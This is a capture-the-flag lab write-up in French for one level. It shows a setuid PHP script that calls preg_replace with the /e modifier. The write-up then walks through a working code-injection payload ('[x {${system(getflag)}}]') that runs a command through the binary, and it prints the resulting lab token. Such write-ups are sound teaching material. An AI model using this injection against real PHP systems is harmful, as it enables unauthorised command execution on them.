# LEVEL 06

- Same as usual
```
ls -l
total 12
-rwsr-x---+ 1 flag06 level06 7503 Aug 30  2015 level06
-rwxr-x---  1 flag06 level06  356 Mar  5  2016 level06.php
cat level06.php
```


```php
#!/usr/bin/php
<?php
function y($m) {
  $m = preg_replace("/\./", " x ", $m);
  $m = preg_replace("/@/", " y", $m);
  return $m;
}
function x($y, $z) {
  $a = file_get_contents($y);
  $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);
  $a = preg_replace("/\[/", "(", $a);
  $a = preg_replace("/\]/", ")", $a);
  return $a;
}
$r = x($argv[1], $argv[2]);
print $r;
?>

```

- `preg_replace` est la seule fonction appellee, en googlant 'preg_replace exploit' on trouve [ca](https://captainnoob.medium.com/command-execution-preg-replace-php-function-exploit-62d6f746bda4)
- Le script perl:
	1. lit un fichier dont le nom est passe en deuxieme argument
	2. passe le contenu de ce fichier a travers une regex de substitution
	3. execute le code
- On veut excecuter getflag dans un terminal, ce qui donne en perl `system(getflag)`
- On doit donc ecrire dans un fichier une string qui apres transformation par la regex donne `system(getflag)`
- Une session de bidouille intense sur ce [site](https://www.functions-online.com/preg_replace.html) de regex nous permet de trouver la solution: `{${system(getflag)}}`

```bash
echo "[x {\${system(getflag)}}]" > /var/crash/level06
./level06 /var/crash/level06 xxx
```
```
PHP Notice:  Use of undefined constant getflag - assumed 'getflag' in /home/user/level06/level06.php(4) : regexp code on line 1
Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub in /home/user/level06/level06.php(4) : regexp code on line 1
```


`echo '[x {${system(getflag)}}]' > /tmp/lol; ./level06 /tmp/lol lol`
- On peut se log avec `wiok45aaoguiboiki2tuin6ub`
